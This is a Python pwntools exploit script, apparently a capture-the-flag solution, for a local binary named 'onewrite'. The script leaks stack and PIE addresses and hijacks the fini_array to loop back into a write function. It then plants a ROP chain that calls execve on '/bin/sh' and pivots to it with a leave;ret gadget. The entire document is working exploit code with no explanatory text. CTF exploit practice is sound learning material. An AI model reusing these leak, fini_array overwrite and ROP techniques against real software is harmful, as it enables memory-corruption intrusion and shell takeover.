from pwn import *

binary = context.binary = ELF("./onewrite")

r = process(binary.path)
gdb.attach(r, api=True)
payload = ""

def write(addr,value):
    r.sendafter(b"address : ", str(addr).encode())
    r.sendafter(b"data : ", p64(value))


r.sendline(b"1")
stack_leak = int(r.recvuntil(b"address : ").split(b"\n")[4].split(b"> ")[1],16)
log.info(f"stack leak: {hex(stack_leak)}")
log.info(f"stack leak - 72: {hex(stack_leak - 72)}")
r.send(str(stack_leak + 24).encode())

r.recv()
r.send(p8(0x04))
r.recv()
r.sendline(b"2")
# print(r.recv())
pie_leak = int(r.recv().split(b"\n")[0],16)
log.info(f"Pie leak: {hex(pie_leak)}")
pie_base = pie_leak - binary.sym['do_leak']
finiArray_addr = pie_base + binary.sym['__do_global_dtors_aux_fini_array_entry']
libc_csu_fini = pie_base + binary.sym['__libc_csu_fini']



log.info(f"pie_base: {hex(pie_base)}")
log.info(f"fini_array: {hex(finiArray_addr)}")
log.info(f"__libc_csu_fini: {hex(libc_csu_fini)}")
leave = 0x000000000005cfaa
log.info(f"leave: {hex(pie_base + leave)}")

do_overwrite = pie_base + binary.sym['do_overwrite']
log.info(f"do_overwrite: {hex(do_overwrite)}")


r.send(str(finiArray_addr + 8).encode())
r.sendafter(b"data : ", p64(do_overwrite))

r.send(str(finiArray_addr).encode())
r.sendafter(b"data : ", p64(libc_csu_fini))

'''
0x00000000000460ac : pop rax ; ret # 16
0x00000000000084fa : pop rdi ; ret # 32
0x000000000000d9f2 : pop rsi ; ret # 48
0x00000000000484c5 : pop rdx ; ret # 64
0x000000000000917c : syscall # 80
0x000000000005cfaa : leave ; ret

0x0000000000008076 : ret

0x000000000001032b : add rsp, 0xd8 ; ret

'''

pop_rax = 0x00000000000460ac
pop_rdi = 0x00000000000084fa
pop_rdx = 0x00000000000484c5
pop_rsi = 0x000000000000d9f2
syscall = 0x000000000000917c
ret = 0x0000000000008076
add_rsp_0xd8 = 0x000000000001032b

stack_ROPchain = stack_leak + 0xd0 - 16
log.info(f"stack store ROPchain: {hex(stack_ROPchain)}")
log.info(f"ret of do_overwrite: {hex(stack_leak - 0x68)}")
#addr to store /bin/sh


# r.send(str(stack_leak - 0x88).encode())
# r.sendafter(b"data : ", p8(0x46))
log.info(f"b*: {hex(leave + pie_base)}")


print("pop rax")
r.send(str(finiArray_addr + 16).encode())
r.sendafter(b"data : ", p64(pie_base + pop_rax))

r.send(str(finiArray_addr + 24).encode())
r.sendafter(b"data : ", p64(0x3b))

print("pop rdi")
r.send(str(finiArray_addr + 32).encode())
r.sendafter(b"data : ", p64(pie_base + pop_rdi))

r.send(str(finiArray_addr + 40).encode())
r.sendafter(b"data : ", p64(finiArray_addr + 88))

print("pop rsi")
r.send(str(finiArray_addr + 48).encode())
r.sendafter(b"data : ", p64(pie_base + pop_rsi))

r.send(str(finiArray_addr + 56).encode())
r.sendafter(b"data : ", p64(0))

print("pop rdx")
r.send(str(finiArray_addr + 64).encode())
r.sendafter(b"data : ", p64(pie_base + pop_rdx))

r.send(str(finiArray_addr + 72).encode())
r.sendafter(b"data : ", p64(0))

print("syscall")
r.send(str(finiArray_addr + 80).encode())
r.sendafter(b"data : ", p64(pie_base + syscall))

print("bin/sh")
r.send(str(finiArray_addr + 88).encode())
r.sendafter(b"data : ", b"/bin/sh\x00")

print("leave")
r.send(str(finiArray_addr ).encode())
r.sendafter(b"data : ", p64(leave + pie_base) )


r.interactive()